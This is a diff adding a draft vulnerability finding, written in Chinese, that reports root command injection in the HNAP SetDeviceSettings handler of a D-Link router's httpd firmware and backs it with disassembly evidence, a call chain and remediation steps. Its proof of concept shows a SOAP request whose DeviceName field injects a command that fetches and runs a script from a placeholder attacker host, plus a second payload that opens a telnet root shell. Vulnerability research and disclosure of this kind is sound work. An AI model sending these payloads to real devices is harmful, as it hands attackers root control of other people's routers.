@@ -1,0 +1,33 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "HNAP SetDeviceSettings 的 DeviceName 参数未过滤即拼入 shell 命令，导致命令注入 RCE",
+  "severity": "critical",
+  "confidence": 0.55,
+  "vuln_class": "命令注入",
+  "cwe": "CWE-78",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "固件 bin/httpd（D-Link R15A1, R15A1_FW122B01）内置 HNAP 处理链（\"ws-hnap/*.c\"）中，SOAP/HNAP 动作 SetDeviceSettings 的 DeviceName XML 字段只经过 hnap_xml_special_char_decoding（仅还原 &lt; &amp; &gt; &quot; &apos;）便写入请求上下文 a1+65。save_CSID_SetDeviceSettings(sub_470F24) 把该缓冲区当作格式化参数送入 exec_cmd，格式串为 \"event_notifier 3001 \\\"U=0&Y=261&I=0&D=%s\\\"&\"，DeviceName 未被引号/元字符转义，可闭合双引号并以 ; ` $() | & 注入任意 shell 命令；同一缓冲区还以 \"(fota -T %s; fota -I; fota -fQ) &\" 送入 exec_cmd。反汇编证据：0047122c-00471340 先 sw 格式串(%s) 再 sw DeviceName 到栈参，jal _exec_cmd(file=\"ws-hnap/SetDeviceSettings.c\", func=\"save_CSID_SetDeviceSettings\", line=0xA8)。httpd 以 root 运行，命令以 root 执行。注意 AdminPassword 分支的 system(\"openssl passwd -5 -in /tmp/iii ...\") 走文件不构成注入；SetSysLogSettings 的 IPAddress 经 inet_addr() 校验，均不构成本条。",
+  "evidence": [
+    "httpd @0x470F24 反汇编 00471314-00471340: jal syscall(0x107E) 取日志句柄后，sw \"event_notifier 3001 \\\"U=0&Y=261&I=0&D=%s\\\"&\" 到 $sp+0x490，紧接着 sw $s2(=DeviceName 缓冲区 a1+65) 到 $sp+0x494，再 jal _exec_cmd($v0,\"ws-hnap/SetDeviceSettings.c\",\"save_CSID_SetDeviceSettings\",0xA8)",
+    "httpd @0x4704xx(sub_470D80)：a3+65 由 sub_424F18(dlink_decrypt) 填充；a3 由 sub_4714DC(sub_4714DC 解析 DeviceName/AdminPassword/ChangePassword/TZLocation 键值对) 传入，sub_4714DC 由 SetDeviceSettings_put(sub_4716BC) 以 sub_4714DC(params, 0, a3-1) 调用",
+    "hnap_xml_special_char_decoding(sub_422DE4 @0x422DE4) 仅解码 &lt; &amp; &gt; &quot; &apos; 五种 XML 实体，不做任何 shell 元字符（\" ; ` $ ( ) | &）转义或黑名单过滤",
+    "HNAP 动作→处理函数派发表位于 .data 0x4EE050 起（每项 16 字节：request-handler / response-builder / 动作名指针 / 0x01000000），动作名字符串表位于 .rodata 0x4C4840 起（\"GetDeviceSettings\"/\"SetDeviceSettings\"/\"SetAdministrationSettings\"/\"GetVirtualServerSettings\" 等）",
+    "process_method_hnap(sub_4084AC @0x4084AC) 直接以 vtable(=HNAP 方法表项) 的 +24/+28/+32 三个间接调用处理请求体，调用前后均无任何会话/凭据校验代码，仅 malloc(0x200000) 承载 body（httpd.c:2626/2653/2689）",
+    "httpd 以 root 身份由 /etc/init.d 启动链拉起（etc/init.d/rc* 与 etc/scripts 中的启动脚本），httpd 运行期持有 csman 配置库写权限（write_csman_* 遍布 HNAP 处理链）"
+  ],
+  "session_id": "s-mudkqaoe-70ee",
+  "function_name": "sub_470F24",
+  "preconditions": "httpd(80/tcp) 可从 LAN/WAN 侧访问且 HNAP 端点可达（本固件监听 80，web 根 /tmp/www3 由 /usr/local/www.tgz 解包）；请求体需符合 HNAP/XML 结构并可经 dlink_decrypt 路径（AdminPassword 字段用设备当前管理员口令做 AES-256-CTR 密钥）解析出 DeviceName。无需已登录 Web 会话的代码路径未见强制校验，但该结论未做动态验证，需模拟环境确认。",
+  "exploit_sketch": "1) 目标 80 端口发 HNAP SetDeviceSettings SOAP 请求，DeviceName 填 `x\"; <cmd>; #`。2) sub_470D80 将该字段写 ctx+65。3) sub_470F24 第 0xA8 行把 `U=0&Y=261&I=0&D=%s` 与 ctx+65 组进 `event_notifier 3001 \"...\"&` 交给 exec_cmd，双引号被 `\"` 闭合后 `;`/`$()`/反引号 直接落入 /bin/sh -c。4) 命令以 root 执行，可实现反弹 shell / 落地 busybox 后门 / 写 /etc/passwd 变体。5) 备选沉降点：同一函数 0xE9 行 `(fota -T %s; fota -I; fota -fQ) &`（参数为 ctx+172，来源 sub_470D80 的 snprintf(a3+172,33,\"%s\",v12)）。",
+  "remediation": "1) 对所有进入命令行的 HNAP 字段（DeviceName、TZLocation、DDNS/邮件/日志等）改用白名单校验（长度 + 字符集），拒绝 \" ; ` $ ( ) | & \\n 等；2) 用 execve/posix_spawn 传参数数组替代 shell 拼接，或在拼接前做单引号包裹 + 逐字符转义；3) exec_cmd 的日志式封装禁止把用户数据当格式串/参数直接喂给 /bin/sh -c；4) HNAP 所有 Set* 动作在派发前统一做会话与 CSRF 校验，并对 /HNAP1 端点限制为已认证会话。",
+  "poc": "POST /HNAP1/ HTTP/1.1\nHost: 192.168.0.1\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://purenetworks.com/HNAP1/SetDeviceSettings\"\nContent-Length: <len>\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SetDeviceSettings xmlns=\"http://purenetworks.com/HNAP1/\">\n      <DeviceName>Router\"; wget -O /tmp/x http://ATTACKER/x; sh /tmp/x; #</DeviceName>\n      <AdminPassword>Admin</AdminPassword>\n      <ChangePassword>false</ChangePassword>\n    </SetDeviceSettings>\n  </soap:Body>\n</soap:Envelope>\n\n命令注入等价载荷（若走 fota 分支，字段为 ctx+172）：DeviceName=Router\";telnetd -l /bin/sh -p 2323;#",
+  "call_chain": "网络 80/tcp (IN-003 HTTP) → httpd 60 字节头解析 sub_403E78 @0x403E78 (处理 /DHMAPI、DHMAPI/dlcfg.cgi 等) → HNAP 分发 process_method_hnap @0x4084AC (HNAP 方法表 .data 0x4EE050，间接调用 +24/+28/+32) → SetDeviceSettings SOAP 请求体解析 SetDeviceSettings_put sub_4716BC @0x4716BC → sub_4714DC @0x4714DC (提取 DeviceName/AdminPassword/TZLocation) → sub_470D80 @0x470D80 (hnap_xml_special_char_decoding 写入 ctx+65) → 命令注入点 save_CSID_SetDeviceSettings sub_470F24 @0x470F24 → exec_cmd(PLT 0x4ED02C) → 00047130c/000471340：exec_cmd(..., \"event_notifier 3001 \\\"U=0&Y=261&I=0&D=%s\\\"&\", DeviceName) 与 exec_cmd(..., \"(fota -T %s; fota -I; fota -fQ) &\", ctx+172)",
+  "function_addr": "0x470f24",
+  "id": "F-mudl4mdb-5edd",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-23T04:10:28Z",
+  "history": []
+}
